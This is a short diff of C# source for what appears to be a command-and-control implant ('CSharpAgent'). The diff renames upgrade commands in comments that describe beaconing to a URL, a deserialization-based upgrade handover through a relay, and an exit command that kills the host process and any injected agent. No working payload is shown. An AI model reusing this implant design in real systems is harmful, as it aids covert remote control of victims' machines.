@@ -37,7 +37,7 @@ namespace CSharpAgent
             _headers = headers;
             Log("beaconing to " + beaconUrl + " as " + headers[1][1]);
 
-            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
+            // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B UpgradeNetFramework command
             // that the relay already delivered to the JScript agent on this machine; the
             // requester waiting on the relay's FIFO expects that command's u32 status on the
             // NEXT request body this session sends. That next request is OUR first POST, so it
@@ -106,8 +106,8 @@ namespace CSharpAgent
         }
 
         // Command dispatch. Exit (0x0A) never returns — it kills the host process (and any
-        // agent injected into it: correct "terminate implant" semantics). NativeUpgrade (0x0C)
-        // is this breed's ONE capability; everything else — the deserialization Upgrade
+        // agent injected into it: correct "terminate implant" semantics). UpgradeNative (0x0C)
+        // is this breed's ONE capability; everything else — the deserialization UpgradeNetFramework
         // included — replies status 2 (unknown for this breed), mirroring how the JScript
         // agent treats every command but its own.
         private static byte[] Dispatch(byte[] command)
